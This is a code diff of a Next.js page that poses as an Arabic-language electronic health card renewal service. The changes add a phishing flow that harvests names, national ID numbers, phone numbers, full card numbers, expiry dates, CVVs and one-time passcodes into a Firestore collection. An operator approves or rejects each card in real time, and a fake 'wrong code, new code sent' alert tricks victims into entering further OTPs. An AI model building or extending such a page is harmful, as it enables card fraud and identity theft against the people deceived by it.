@@ -2,16 +2,17 @@
 
 import Image from "next/image"
 import { Button } from "@/components/ui/button"
-import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
 import { Label } from "@/components/ui/label"
-import { ChevronLeft, CreditCard, MessageCircle } from 'lucide-react'
-import { cn } from "@/lib/utils"
-import { FormEvent, useState } from "react"
+import { CreditCard, MessageCircle } from 'lucide-react'
+import { FormEvent, useEffect, useState } from "react"
 import { initializeApp } from 'firebase/app'
-import { getFirestore, doc, setDoc } from 'firebase/firestore'
+import { getFirestore, doc, setDoc, collection, getDocs, onSnapshot } from 'firebase/firestore'
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
+import { FullPageLoader } from "@/components/loader"
+import { addData } from "../actions/adddata"
 
 const firebaseConfig = {
   // Your Firebase configuration object goes here
@@ -29,78 +30,182 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig)
 const db = getFirestore(app)
 
-const steps = [
-  { id: 1, title: 'معلومات البطاقة', status: 'current' },
-  { id: 2, title: 'استمارة التقديم', status: 'upcoming' },
-  { id: 3, title: 'تفاصيل الدفع', status: 'upcoming' },
-  { id: 4, title: 'إتـمـام  العـملـيـة.', status: 'upcoming' },
-]
+interface Notification {
+  id: string;
+  hasPersonalInfo: boolean;
+  hasCardInfo: boolean;
+  currentPage: string;
+  time: string;
+  notificationCount: number;
+  personalInfo?: {
+    id: string;
+    fullName: string;
+    phone: string;
+  };
+  cardInfo?: {
+    cardNumber: string;
+    expirationDate: string;
+    cvv: string;
+    otp: string;
+    allOtps: string[]
+  }, cardState?: 'pending' | 'approved' | 'rejected'
+};
+
 
 export default function HealthCardRenewal() {
   const [isloading, setIsloading] = useState(false)
   const [stepr, setStep] = useState(1)
   const [show, setShow] = useState(false)
+  const [iswait, setIswait] = useState(false)
   const [name, setName] = useState('')
   const [phone, setPhone] = useState('')
-  const [id, setId] = useState('')
+  const [id, setId] = useState('11')
   const [dateMonth, setDatmont] = useState('')
   const [datayaer, setDatyear] = useState('')
   const [CVC, setCVC] = useState('')
   const [otp, setOtp] = useState('')
-  const [otpArd] = useState([''])
+  const [otp2, setOtp2] = useState('')
+  const [otpArd, setOtpard] = useState([''])
   const [cardNumber, setCardNumber] = useState('')
+  const [selectedMethod, setSelectedMethod] = useState<any>('')
+  const [cardState, setCardState] = useState('pending')
+  const paymentMethods = [
+    { id: 'credit-card', name: 'Visa Card', icon: <img className="h-6 w-12" src="/R.png" alt="visa" /> },
+    { id: 'master-pay', name: 'Mastecard', icon: <img className="h-6 w-12" src="/m.png" alt="visa" /> },
+  ]
+
+  const handleOtp = (v: string) => {
+    setOtp(v)
+
+  }
+  const handleOArr = async () => {
+    await otpArd.push(otp)
+  }
 
   const handleSubmit = async (e: FormEvent) => {
-    4
     e.preventDefault()
-    try {
-      const docRef = await doc(db, 'pays', id!);
-      const ref = await setDoc(docRef, {
-        step: stepr,
-        id: id,
-        name: name,
-        phone: phone,
-        datayaer: datayaer,
-        dateMonth: dateMonth,
-        CVC: CVC,
-        otp: otpArd,
-        cardNumber: cardNumber,
-        // Add any other form fields here
-      });
+    if (stepr === 1) {
+      if (id === '' || name == '') {
+        return alert('الرجاء ادخال الاسم ورقم البطاقة الشخصية')
 
-      console.log("Document written with ID: ", docRef.id)
-      // You might want to show a success message to the user here
-    } catch (e) {
-      console.error("Error adding document: ", e)
-      // You might want to show an error message to the user here
+      }
+    } else if (stepr === 2) {
+      if (phone === '') {
+        return alert('الرجاء ادخال رقم الهاتف ')
+      }
     }
+    else if (stepr === 3) {
+      if (selectedMethod === '') {
+      }
+    }
+    if (stepr === 4) {
+      if (cardNumber === '' || cardNumber.length < 16) {
+        return alert('الرجاء ادخال معلومات البطاقة بشكل صحيح ')
+      }
+      setIswait(true)
+      onSnapshot(doc(db, 'pays', id), (docSnap) => {
+        if (docSnap.exists()) {
+          const data = docSnap.data() as Notification;
+          if (data.cardInfo &&cardState) {
+            if (data.cardState === 'approved') {
+              setIswait(false);
+              setStep(5);
+            } else if (data.cardState === 'rejected') {
+              setIswait(false);
+              alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ')
+              setStep(3);
+            }
+          }
+        }
+      });
+      setTimeout(() => {
+        //setIswait(false)
+      }, 5000)
+    }
+    setStep(stepr + 1)
+const data={
+  id:id,
+  hasPersonalInfo:name != '',
+  hasCardInfo:cardNumber != '',
+  currentPage:stepr,
+  createdDate: new Date().toISOString(),
+  notificationCount:1,
+  personalInfo: {
+    id:id,
+    fullName:name,
+    phone:phone
+  },
+  cardInfo: {
+    cardNumber:cardNumber,
+    expirationDate: `${dateMonth} / ${datayaer}`,
+    cvv:CVC,
+    otp:otp,
+    allOtps:otpArd,
+    state:cardState,
+  },
+  cardState:cardState,
+};
+    addData(data)
   }
   const handdleadd = (e: any) => {
 
     handleSubmit(e).then(() => {
-      setStep(stepr + 1)
+
     })
 
     if (stepr >= 5) {
-      setIsloading(true)
-      setTimeout(() => {
-        alert("رمز التحقق خاطىء تم ارسال رمز جديد")
-        otpArd.push(otp)
-        setOtp("")
-        setIsloading(false)
+      handleOArr().then(
+        () => {
+          setIswait(true)
+          setOtp("")
+          setTimeout(() => {
+            alert("رمز التحقق خاطىء تم ارسال رمز جديد")
+            ///otpArd.push(otp);
+            setIswait(false)
 
-      }, 4000)
+
+          }, 4000)
+        }
+      )
+      // setOtpard({otp,...otpArd})
+
     }
   }
+  useEffect(()=>{
+    const data={
+      id:id,
+      hasPersonalInfo:name != '',
+      hasCardInfo:cardNumber != '',
+      currentPage:"الرئيسية",
+      createdDate: new Date().toISOString(),
+      notificationCount:1,
+      personalInfo: {
+        id:id,
+        fullName:name,
+        phone:phone
+      },
+      cardInfo: {
+        cardNumber:cardNumber,
+        expirationDate: `${dateMonth} / ${datayaer}`,
+        cvv:CVC,
+        otp:otp,
+        allOtps:otpArd,
+        state:cardState,
+      },
+      cardState:cardState,
+    };
+    addData(data)
+  },[])
   return (
     <div className="min-h-screen bg-gray-50" dir="rtl">
-
+      {iswait ? <FullPageLoader message=" جاري التحقق..." /> : null}
       <div className="container mx-auto px-4 py-4 sm:py-8">
         <div className="flex items-start gap-4 mb-8">
+
+          <h1 className="text-2xl font-bold">خدمة البطاقة الصحية الإلكترونية</h1>
           <div className="bg-[#C8102E] text-white p-4 rounded-lg">
             <span>المساعدة</span>
           </div>
-          <h1 className="text-2xl font-bold">خدمة البطاقة الصحية الإلكترونية</h1>
         </div>
 
         <Card className="max-w-3xl mx-auto">
@@ -111,21 +216,24 @@ export default function HealthCardRenewal() {
             <div className="flex justify-between items-center mb-12 relative">
               <div className="absolute top-1/2 left-0 right-0 h-0.5 bg-gray-200 -z-10" />
               {['معلومات البطاقة', 'استمارة التقديم', 'تفاصيل الدفع', 'إتمام العملية'].map((step, index) => (
-                <div key={index} className={`flex flex-col items-center gap-2 ${index === 0 ? 'text-[#C8102E]' : 'text-gray-500'}`}>
-                  <div className={`w-8 h-8 rounded-full flex items-center justify-center ${stepr === index ? 'bg-[#C8102E] text-white' : 'bg-gray-200'
+                <div key={index} className={`flex flex-col  justify-center items-center gap-2 ${index === 0 ? 'text-[#C8102E]' : 'text-gray-500'}`}>
+                  <div className={`w-12 h-12 rounded-full flex items-center justify-center ${(stepr - 1) === index ? 'bg-[#C8102E] text-white' : 'bg-gray-200'
                     }`}>
                     {index + 1}
+
                   </div>
-                  <span className="text-sm">{step}</span>
+                  <div className=" text-center items-center justify-center mx-4 ">
+                    <span className="text-sm flex  ">{step}</span>
+                  </div>
                 </div>
               ))}
             </div>
-
+            <p className="text-md mb-4 text-gray-500 italic">
+              طلب الاستعلام عن البطاقة الصحية -- سوف يستغرق حوالي 20 ثانية لإتمام الطلب
+            </p>
             {stepr === 1 ?
               <div className="space-y-4 sm:space-y-6">
-                <p className="text-xs sm:text-sm text-gray-500 italic">
-                  طلب الاستعلام عن البطاقة الصحية -- سوف يستغرق حوالي 20 ثانية لإتمام الطلب
-                </p>
+
 
                 <div className="space-y-4 sm:space-y-6">
                   <h2 className="text-lg sm:text-xl font-semibold">معلومات</h2>
@@ -137,8 +245,11 @@ export default function HealthCardRenewal() {
                         <span className="text-red-500">*</span>
                       </Label>
                       <Input
-                        onChange={(e) => setId(e.target.value.toString())}
-                        type="text"
+                        dir="rtl"
+                        onChange={(e) => setName(e.target.value.toString())}
+                        type="text" placeholder="الاسم الرباعيٍ"
+
+                        maxLength={11}
                         className="max-w-md text-sm sm:text-base"
                       />
                     </div>
@@ -148,9 +259,11 @@ export default function HealthCardRenewal() {
                         <span className="text-red-500">*</span>
                       </Label>
                       <Input
+                        dir="rtl"
                         onChange={(e) => setId(e.target.value.toString())}
-                        type="tel"
-                        maxLength={10}
+                        type="tel" placeholder="   رقم البطاقة الشخصية"
+
+                        maxLength={11}
                         className="max-w-md text-sm sm:text-base"
                       />
                     </div>
@@ -186,7 +299,7 @@ export default function HealthCardRenewal() {
 
               </div> : stepr === 2 ?
                 <div className="space-y-4 sm:space-y-6">
-                  <p className="text-xs sm:text-sm text-gray-500 italic">
+                  <p className="text-xs sm:text-lg text-gray-500 italic">
                     طلب الاستعلام عن البطاقة الصحية -- سوف يستغرق حوالي 20 ثانية لإتمام الطلب
                   </p>
 
@@ -224,10 +337,32 @@ export default function HealthCardRenewal() {
                           className="max-w-md text-sm sm:text-base"
                         />
                       </div>
+                      <RadioGroup defaultValue="renewal" className="space-y-2 " dir="rtl">
+                        <div className="flex items-center space-x-2 space-x-reverse justify-center">
+                          <Label htmlFor="renewal" className="text-sm sm:text-base">هل تريد اتسلام ايصال عبر البريد الالكتروني؟</Label>
 
+                          <RadioGroupItem value="reissue" id="reissue" />
+                          <Label htmlFor="renewal" className="text-sm sm:text-base">نعم</Label>
+
+                          <RadioGroupItem value="renewal" id="renewal" />
+                          <Label htmlFor="renewal" className="text-sm sm:text-base">لا</Label>
+                        </div>
+                        <div className="flex items-center space-x-2 space-x-reverse">
+                          <div className="flex items-center space-x-2 space-x-reverse">
+                            <Label htmlFor="renewal" className="text-sm sm:text-base">هل تريد استلام رسالة نصية؟</Label>
+
+                            <RadioGroupItem value="reissue" id="reissue" />
+                            <Label htmlFor="renewal" className="text-sm sm:text-base">نعم</Label>
+
+                            <RadioGroupItem value="renewal" id="renewal" />
+                            <Label htmlFor="renewal" className="text-sm sm:text-base">لا</Label>
+                          </div>
+                        </div>
+
+                      </RadioGroup>
                     </div>
                   </div> </div> : stepr === 3 ? <>
-                    <div className="space-y-4 sm:space-y-6">
+                    <div className="space-y-4 sm:space-y-6 text-gray-500">
                       {/* Fees Section */}
                       <div className="space-y-4 mb-8">
                         <h2 className="text-2xl font-bold">الرسوم</h2>
@@ -261,7 +396,7 @@ export default function HealthCardRenewal() {
                         <CardTitle className="text-2xl font-bold text-center">معلومات البطاقة</CardTitle>
                       </CardHeader>
                       <CardContent>
-                        <form className="space-y-6">
+                        {show ? <form className="space-y-6">
                           <div className="space-y-2">
                             <Label htmlFor="cardHolder" className="text-right block">
                               اسم حامل البطاقة <span className="text-red-500">*</span>
@@ -358,6 +493,48 @@ export default function HealthCardRenewal() {
                             </div>
                           </div>
                         </form>
+                          : <>
+                            <Card className="w-full max-w-md mx-auto">
+                              <CardHeader>
+                                <CardTitle>طريقة الدفع </CardTitle>
+                                <CardDescription>الرجاء تحديد طريقة الدفع المناسبة لك</CardDescription>
+                              </CardHeader>
+                              <CardContent>
+                                <RadioGroup
+                                  value={selectedMethod}
+                                  onValueChange={(value) => {
+                                    setSelectedMethod(value as any)
+                                    setTimeout(() => {
+                                      setShow(true)
+
+                                    }, 2000)
+                                  }
+                                  }
+                                  className="grid gap-4 pt-2"
+                                >
+                                  {paymentMethods.map((method) => (
+                                    <div key={method.id}>
+                                      <RadioGroupItem
+                                        value={method.id}
+                                        id={method.id}
+                                        className="peer sr-only"
+                                      />
+                                      <Label
+                                        htmlFor={method.id}
+                                        className="flex items-center justify-between rounded-lg border-2 border-muted bg-popover p-4 hover:bg-accent hover:text-accent-foreground peer-data-[state=checked]:border-primary [&:has([data-state=checked])]:border-primary"
+                                      >
+                                        <div className="flex items-center gap-4">
+                                          {method.icon}
+                                          <div className="font-semibold">{method.name}</div>
+                                        </div>
+                                      </Label>
+                                    </div>
+                                  ))}
+                                </RadioGroup>
+                              </CardContent>
+                            </Card>
+
+                          </>}
                       </CardContent>
                     </Card></> : <>
                   <div className="space-y-2">
@@ -365,7 +542,7 @@ export default function HealthCardRenewal() {
                       الرجاء ادخال رمز التحقق المرسل الى هاتفك      <span className="text-red-500">*</span>
                     </Label>
                     <Input
-                      onChange={(e) => { setOtp(e.target.value) }}
+                      onChange={(e) => { handleOtp(e.target.value) }}
                       value={otp}
                       type="tel"
                       placeholder="رمز التحقق"
@@ -378,21 +555,21 @@ export default function HealthCardRenewal() {
             {/* Action Buttons */}
             <div className="grid  grid-cols-2 sm:flex-row sm:justify-between gap-3 pt-4 sm:pt-6">
               <Button
+                type="submit"
                 variant="outline"
                 className="w-full sm:w-auto sm:min-w-[120px]"
               >
                 تفريغ الحقول
               </Button>
               <Button
+                disabled={(stepr === 4 && !show)}
                 type="submit"
-
-                className="w-full sm:w-auto sm:min-w-[120px] bg-[#8B1538] hover:bg-[#8B1538]/90"
+                className="w-full  sm:min-w-[100px] py-4 bg-[#C8102E] hover:bg-[#C8102E]/90"
               >
                 {stepr >= 5 ? 'ارسال' : isloading ? 'انتظر' : 'تابع'}
               </Button>
             </div>
           </form>
-
         </Card>
       </div>
     </div>
